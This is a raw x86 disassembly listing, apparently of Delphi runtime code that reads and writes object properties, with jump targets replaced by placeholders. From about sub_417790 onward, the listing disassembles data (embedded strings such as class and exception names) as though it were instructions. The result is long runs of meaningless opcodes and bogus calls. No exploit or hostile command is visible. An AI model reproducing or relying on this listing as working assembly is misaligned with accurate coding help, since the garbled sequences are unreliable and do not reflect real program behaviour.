cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_416518
cmp [ eax ] 0x4
jne r-xdata
sub_417064
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_416518
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_4170ac ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4171db ]
jmp [ eax * 4 + jump_table_417148 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_417270
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_41725c
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_4172b0
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_41725c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4172f0
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_417328
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_417350
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_41738c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4059e4
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_417400
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_417446
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41744d
retn
mov eax rw-data
call sub_403f9c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a50
sub_417758
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41777d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417784
retn
sub_417790
xchg esp eax
ja r-xdata
inc ebx
insb
popad
jae r-xdata
add [ ebx ] al
or dl [ ecx + eax * 2 + 0x6c ]
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xd004177 ] dl
je r-xdata
inc ecx
insb
imul esp [ edi + 0x6e ] 0x52646218
jae r-xdata
add [ gs : eax ] eax
dec esp
je r-xdata
insb
or [ gs : ebx + 0x73 ] dh
popad
imul ebp [ fs : esi + 0x67 ] 0x796c6e4f
pop es
test al 0x47
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_417784
retn
loopne r-xdata
add [ eax ] eax
add [ eax ] al
add [ esi ] al
outsd
push edx
jae r-xdata
jne r-xdata
outsd
insb
pop es
inc ebx
insb
popad
jae r-xdata
add [ ecx ] al
or al 0x54
dec eax
insb
jo r-xdata
jae r-xdata
imul esp [ edi + 0x68 ] 0x4c6f5474
inc ecx
add [ ebx ] al
or dl [ esp + ecx * 2 + 0x65 ]
je r-xdata
add [ ebx ] al
or [ eax + ecx * 2 + 0x65 ] edx
insb
jo r-xdata
push ebx
push 0x5746669
jae r-xdata
sbb [ edx + 0x64 ] ah
push edx
bound esp [ edx + edx * 2 + 0x69 ]
push 0x4c6f5474
je r-xdata
retn
inc eax
add [ eax ] cl
js r-xdata
imul esp [ edi + 0x68 ] 0x64620d74
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x74 ] ebp
inc ebx
outsd
outsb
add [ ecx ] ecx
push esp
push ebx
push 0x4374726f
jae r-xdata
popad
jae r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax + edi * 2 + 0x41 ] dh
add [ edi ] al
jae r-xdata
sar [ eax + 0x78 ] 0x41
je r-xdata
imul esp [ edi + 0x68 ] 0x174
add [ eax ] al
add [ eax ] eax
add [ eax ] al
nop
ja r-xdata
outsb
je r-xdata
jns r-xdata
push esp
inc ecx
insb
je r-xdata
jae r-xdata
outsd
je r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edi * 2 ] al
inc ecx
add [ ebx ] al
or [ edx + eax * 2 + 0x69 ] edx
inc esp
imul ecx [ ebp + 0x6f ] 0x16564
dec esp
je r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jpe r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jns r-xdata
js r-xdata
inc eax
add [ eax * 2 + 0x65727453 ] cl
popad
add ah ah
xor [ eax ] eax
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + 0x79 ] dl
inc ecx
add [ eax ] cl
or al 0x54
dec esi
outsd
je r-xdata
int3
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
jae r-xdata
je r-xdata
js r-xdata
dec edi
outsb
insb
jns r-xdata
jae r-xdata
je r-xdata
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc ecx
add [ gs : eax ] eax
push es
jae r-xdata
jae r-xdata
mov eax eax
in al 0x78
inc ecx
je r-xdata
or [ ecx + 0x43 ] dh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edx + 0x41 ] 0x0
or al 0x0
add [ eax ] al
aam 0x79
inc ecx
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00417a ] al
add [ eax ] al
add ah dl
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edx + 0x41 ] bh
add [ eax + eax ] cl
add [ eax ] al
in al dx
pop es
inc ebx
insb
cmp al 0x32
jns r-xdata
jae r-xdata
je r-xdata
outsd
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : eax + eax - 0x7c ] si
jns r-xdata
jb r-xdata
add al 0x1
add [ eax ] al
cmp bh 0xff
mov eax eax
js r-xdata
inc ebx
insb
popad
jae r-xdata
add [ ecx + edx + 0x408d0040 ] al
add ah al
jns r-xdata
adc [ eax ] eax
lea eax [ eax ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x7c ] si
jns r-xdata
add [ ecx ] cl
push 0x79654b74
ja r-xdata
js r-xdata
cld
dec esp
je r-xdata
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add ah bh
insb
outsd
dec esp
jb r-xdata
add [ 0x654c6462 ] cl
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x73754a74
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ 0x72434645 ] cl
popad
je r-xdata
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ edx + 0x41 ]
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
inc eax
add [ eax ] ah
jpe r-xdata
jb r-xdata
add ah ch
jbe r-xdata
je r-xdata
push 0x6e6f4374
inc esp
outsd
jne r-xdata
dec ebp
imul esp [ esp + 0x6c ] 0x73730865
les edi [ ecx + 0x41 ]
add [ ecx ] al
or [ ebx + edx * 2 + 0x68 ] edx
outsd
jb r-xdata
je r-xdata
add [ ebx ] al
add ch [ esi ]
xor [ ecx ] eax
add [ eax ] al
add [ eax ] al
push es
inc ecx
add [ edx ] dh
inc eax
jb r-xdata
or [ ebx + 0x73 ] dh
jae r-xdata
nop
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
jns r-xdata
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x7b
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jpe r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0xc0041 ] cl
add [ eax ] al
call 0xffffffff9441bce7
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
outsb
inc ebp
jb r-xdata
inc eax
add [ eax ] dl
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
add [ edx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al [ eax ]
or al 0x45
push ebx
je r-xdata
xor al 0x40
pushfd
jne r-xdata
inc ebx
dec ebx
jns r-xdata
push edx
imul esp [ edi + 0x68 ] 0x73730874
pop es
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 ] bh
outsd
jb r-xdata
inc eax
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
jpo r-xdata
inc eax
add [ edx + esi ] bh
rcr ah 0x7a
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
aam 0x79
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
add [ edx + esi ] bh
inc eax
add [ eax + 0x417a ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ebp
jb r-xdata
popad
add [ eax ] al
les edi [ ecx + 0x41 ]
or eax 0x69526462
push 0x4c6f5474
outsb
je r-xdata
inc ebx
add [ eax ] al
dec esi
outsd
je r-xdata
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
in al 0x31
in al 0x7b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jpo r-xdata
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx ] cl
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
jpo r-xdata
xor [ eax ] eax
outsd
jne r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
call 0xffffffff9441bd97
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x7c
add [ eax + eax ] cl
add [ eax ] al
call 0xffffffff9441bd3f
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 ] dh
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
nop
cwde
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ edx ] dh
inc eax
add [ edx + esi ] bh
dec esp
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
jge r-xdata
lea eax [ eax ]
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00417c ] bl
add [ eax ] al
add ah ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
in al dx
add [ eax ] al
inc ebp
jb r-xdata
add [ edx ] dh
inc eax
add [ edx + esi ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jge r-xdata
add [ eax + eax ] cl
add [ eax ] al
in al dx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
jl r-xdata
inc eax
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
jl r-xdata
outsd
jb r-xdata
add [ edx ] dh
inc eax
add [ edx + esi ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 2 + 0xc0041 ] ah
inc eax
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
movsb [ edi ] [ esi ]
jge r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x7e
add [ eax ] al
in al dx
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
in al dx
jb r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al dx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 ] al
inc eax
add [ eax ] dl
inc ebp
push ebx
je r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
add [ eax ] al
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 2 + 0x41 ] cl
inc eax
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7e ] ah
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x6bffbf8d ] dh
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
dec ecx
outsb
jbe r-xdata
rol [ eax + 0x417f ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edi + 0x41 ] 0x0
and al 0x0
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov al [ 0xb0041a4 ]
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x5d9fffbf ] bh
inc ecx
add [ eax - 0x5c ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x7f
jne r-xdata
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ esi + edi * 2 ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ ecx ] dl
inc ebp
xor [ eax ] eax
jb r-xdata
add [ eax ] dl
mov eax [ 0xffffffffa18c0041 ]
inc ecx
add [ 0x73694c54 ] al
je r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x7f1cc08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ edi + 0x41 ]
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
adc al 0xa6
inc ecx
add [ 0x74694254 ] al
jae r-xdata
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax + 0xb0041a4 ] ah
shr [ eax + eax * 4 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80 ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
add [ ecx ] 0x46
add [ ecx ] 0x4
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffbe59 ] dh
test al 0x41
add al cl
test al 0x41
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 2 ] ch
jb r-xdata
arpl [ ebp + 0x73 ] sp
mov esp 0x417e
add [ eax ] al
add [ eax ] al
add [ eax ] al
